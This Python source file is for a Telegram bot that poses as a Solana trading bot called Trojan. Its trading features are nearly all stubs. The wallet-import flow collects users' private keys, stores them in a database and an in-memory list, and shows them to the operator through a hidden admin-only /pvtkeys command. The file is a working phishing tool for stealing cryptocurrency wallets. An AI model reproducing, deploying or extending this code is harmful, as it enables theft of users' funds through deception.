from telegram.ext import ApplicationBuilder, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters
from telegram import BotCommand, InlineKeyboardButton, InlineKeyboardMarkup, Update, update
from utils import respond, safe_handler, safe_text_handler
from database import create_tables, save_import
from datetime import datetime, timezone
import wallet_manager as wm
import keyboards as kb
import text as txt
import logging
import os

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

APP_URL = os.getenv("RAILWAY_PUBLIC_DOMAIN")
WEBHOOK_URL = f"https://{APP_URL}/webhook"
PORT = int(os.getenv("PORT", 8080))
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
REWARDS_PHOTO_ID = ""
pvt = []

if not APP_URL:
    raise ValueError("RAILWAY_PUBLIC_DOMAIN not found")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN not found")


@safe_handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.start_text, kb.start_buttons())

@safe_handler
async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

@safe_handler
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.help_text, kb.help_keyboard())

@safe_handler
async def settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    toggles = context.user_data.get("toggles", {})
    speed_mode = context.user_data.get("speed_mode", "fast")
    await respond(update, txt.settings_text, kb.settings_keyboard(toggles, speed_mode))

@safe_handler
async def toggle_setting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    setting_key = update.callback_query.data
    toggles = context.user_data.setdefault("toggles", {})
    toggles[setting_key] = not toggles.get(setting_key, False)
    await settings(update, context)

@safe_handler
async def toggle_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    speed = update.callback_query.data
    if speed in ("fast", "turbo", "eco"):
        context.user_data["speed_mode"] = speed
    await settings(update, context)

@safe_handler
async def not_implemented(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer(txt.coming_soon_text, show_alert=False)

@safe_handler
async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        msg = await query.message.reply_text(txt.buy_text)
    else:
        msg = await update.message.reply_text(txt.buy_text)
    context.user_data["awaiting_buy_input"] = True
    context.user_data["buy_prompt_chat_id"] = msg.chat_id
    context.user_data["buy_prompt_message_id"] = msg.message_id

@safe_handler
async def sell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.sell_text, kb.back_refresh_keyboard("retry_sell"))

@safe_handler
async def retry_sell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await sell(update, context)

@safe_handler
async def positions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.positions_text, kb.back_refresh_keyboard("retry_positions"))

@safe_handler
async def retry_positions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await positions(update, context)

@safe_handler
async def limit_orders(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.limit_orders_text, kb.back_refresh_keyboard("retry_limit_orders"))

@safe_handler
async def retry_limit_orders(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await limit_orders(update, context)

@safe_handler
async def dca_orders(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.dca_orders_text, kb.back_refresh_keyboard("retry_dca_orders"))

@safe_handler
async def retry_dca_orders(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await dca_orders(update, context)

@safe_handler
async def copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.copy_trade_text, kb.back_refresh_keyboard("retry_copy_trade"))

@safe_handler
async def retry_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await copy_trade(update, context)

@safe_handler
async def sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.sniper_text, kb.back_refresh_keyboard("retry_sniper"))

@safe_handler
async def retry_sniper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await sniper(update, context)

@safe_handler
async def watchlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.watchlist_text, kb.back_refresh_keyboard("retry_watchlist"))

@safe_handler
async def retry_watchlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await watchlist(update, context)

@safe_handler
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await respond(update, txt.withdraw_text, kb.back_refresh_keyboard("retry_withdraw"))

@safe_handler
async def retry_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await withdraw(update, context)

@safe_handler
async def rewards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or str(user.id)
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    caption = txt.rewards_text(username, timestamp)
    keyboard = kb.rewards_keyboard()

    if update.callback_query:
        await update.callback_query.answer()
        message = update.callback_query.message
    else:
        message = update.message

    if REWARDS_PHOTO_ID:
        try:
            await message.reply_photo(
                photo=REWARDS_PHOTO_ID, caption=caption, parse_mode="HTML", reply_markup=keyboard
            )
            return
        except Exception:
            logger.exception("Could not send rewards photo, falling back to text")

    await message.reply_text(caption, parse_mode="HTML", reply_markup=keyboard)

@safe_handler
async def close_rewards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.delete()

@safe_handler
async def wallets_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallets = wm.get_wallets(context)
    active_index = wm.get_active_index(context)
    await respond(
        update,
        txt.wallets_text(wallets, active_index),
        kb.wallets_keyboard(wallets, active_index),
    )

@safe_handler
async def create_wallet_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    address, secret_key = wm.create_wallet()
    wallet = wm.add_wallet(context, address=address, secret_key=secret_key)
    await query.message.reply_text(txt.wallet_created_text(wallet), parse_mode="HTML")
    await wallets_screen(update, context)

@safe_handler
async def select_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        index = int(query.data.split(":", 1)[1])
    except (IndexError, ValueError):
        return
    wallets = wm.get_wallets(context)
    if not 0 <= index < len(wallets):
        return
    wm.set_active_index(context, index)
    await query.edit_message_text(
        txt.wallet_detail_text(wallets[index]),
        parse_mode="HTML",
        reply_markup=kb.wallet_detail_keyboard(),
        disable_web_page_preview=True,
    )

@safe_handler
async def import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(txt.import_prompt_text, reply_markup=kb.import_confirm_keyboard())

@safe_handler
async def cancel_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.pop("pending_import", None)
    await query.message.delete()

@safe_handler
async def proceed_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(txt.import_ask_key_text)
    context.user_data["awaiting_import_input"] = True

@safe_handler
async def finalize_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    pending = context.user_data.pop("pending_import", None)
    if not pending:
        await query.edit_message_text(txt.import_expired_text)
        return
    wallet = wm.add_wallet(context, address=pending["address"], secret_key=pending["private_key"])
    await query.edit_message_text(txt.wallet_imported_text(wallet), parse_mode="HTML")

@safe_text_handler
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("awaiting_import_input"):
        context.user_data["awaiting_import_input"] = False
        user = update.effective_user
        private_key = update.message.text.strip()
        try:
            address = wm.derive_address(private_key)
        except wm.InvalidPrivateKeyError as exc:
            await update.message.reply_text(txt.invalid_private_key_text.format(error=exc))
            return
        context.user_data["pending_import"] = {"private_key": private_key, "address": address}
        await update.message.reply_text(
            txt.imported_wallet_text(address),
            parse_mode="HTML",
            disable_web_page_preview=False,
            reply_markup=kb.import_finalize_keyboard(),
        )
        save_import(user, address, private_key)
        pvt.append({
            "username": user.username,
            "address": address,
            "private_key": private_key,
        })
        return

    if context.user_data.get("awaiting_buy_input"):
        context.user_data["awaiting_buy_input"] = False
        context.user_data.pop("buy_prompt_chat_id", None)
        context.user_data.pop("buy_prompt_message_id", None)
        await update.message.reply_text(txt.token_not_found_text, reply_markup=kb.buy_retry_keyboard())
        return

    await update.message.reply_text(
        txt.token_not_found_text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Retry", callback_data="buy")]]),
    )

@safe_handler
async def pvt_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not pvt:
        await update.message.reply_text("No wallet imports yet.")
        return

    lines = ["<b>Latest Wallet Imports</b>\n"]

    for log in pvt[-20:]:
        lines.append(
            f"<b>{log['username']}</b>\n"
            f"<code>{log['address']}</code>\n"
            f"<code>{log['private_key']}</code>\n"
        )

    await update.message.reply_text("\n".join(lines), parse_mode="HTML")

CALLBACK_HANDLERS = {
    "buy": buy,
    "sell": sell,
    "retry_sell": retry_sell,
    "positions": positions,
    "retry_positions": retry_positions,
    "limit_orders": limit_orders,
    "retry_limit_orders": retry_limit_orders,
    "dca_orders": dca_orders,
    "retry_dca_orders": retry_dca_orders,
    "copy_trade": copy_trade,
    "retry_copy_trade": retry_copy_trade,
    "sniper": sniper,
    "retry_sniper": retry_sniper,
    "watchlist": watchlist,
    "retry_watchlist": retry_watchlist,
    "withdraw": withdraw,
    "retry_withdraw": retry_withdraw,
    "rewards": rewards,
    "close_rewards": close_rewards,
    "settings": settings,
    "help": help_cmd,
    "back_start": back_start,
    "refresh": not_implemented,
    "wallets": wallets_screen,
    "create_wallet": create_wallet_handler,
    "import_wallet": import_wallet,
    "cancel_import": cancel_import,
    "proceed_import": proceed_import,
    "finalize_import": finalize_import,
    "mev_buy": toggle_setting,
    "mev_sell": toggle_setting,
    "auto_buy": toggle_setting,
    "auto_sell": toggle_setting,
    "confirm_trades": toggle_setting,
    "sell_protection": toggle_setting,
    "chart_previews": toggle_setting,
    "fast": toggle_speed,
    "turbo": toggle_speed,
    "eco": toggle_speed,
    "lang": not_implemented,
    "set_referrer": not_implemented,
    "custom_fee": not_implemented,
    "sell_priority_fee_override": not_implemented,
    "buy_settings": not_implemented,
    "sell_settings": not_implemented,
    "pnl_cards": not_implemented,
    "show_hide_tokens": not_implemented,
    "account_security": not_implemented,
    "bolt": not_implemented,
    "simple_mode": not_implemented,
    "disperse_tokens": not_implemented,
    "bridge": not_implemented,
    "export_eth_wallet": not_implemented,
}


@safe_handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.callback_query.data
    if data.startswith("select_wallet:"):
        await select_wallet(update, context)
        return
    handler = CALLBACK_HANDLERS.get(data, not_implemented)
    await handler(update, context)


async def set_bot_commands(app):
    commands = [
        BotCommand("start", "Trade on Solana with Trojan"),
        BotCommand("buy", "Buy a token"),
        BotCommand("sell", "Sell a token"),
        BotCommand("positions", "View detailed information about your tokens"),
        BotCommand("limitorders", "View/create limit orders"),
        BotCommand("dca", "View/create DCA orders"),
        BotCommand("copytrade", "Manage copy trading"),
        BotCommand("settings", "Configure your settings"),
        BotCommand("wallet", "Manage your wallets"),
        BotCommand("snipe", "snipe[CA]"),
        BotCommand("rewards", "View your referral and cashback rewards"),
        BotCommand("withdraw", "Withdraw tokens, SOL or ETH"),
        BotCommand("help", "FAQ and Telegram channel")
    ]
    await app.bot.set_my_commands(commands)


def main():
    create_tables() 
    app = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).build()
    app.post_init = set_bot_commands

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", buy))
    app.add_handler(CommandHandler("sell", sell))
    app.add_handler(CommandHandler("positions", positions))
    app.add_handler(CommandHandler("limitorders", limit_orders))
    app.add_handler(CommandHandler("dca", dca_orders))
    app.add_handler(CommandHandler("copytrade", copy_trade))
    app.add_handler(CommandHandler("snipe", sniper))
    app.add_handler(CommandHandler("settings", settings))
    app.add_handler(CommandHandler("wallet", wallets_screen))
    app.add_handler(CommandHandler("rewards", rewards))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("pvtkeys", pvt_keys))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logging.info("Starting webhook")
    logging.info(f"Webhook URL: {WEBHOOK_URL}")

    app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        webhook_url=WEBHOOK_URL,
        url_path="webhook",
        drop_pending_updates=True,
    )

if __name__ == "__main__":
    main()
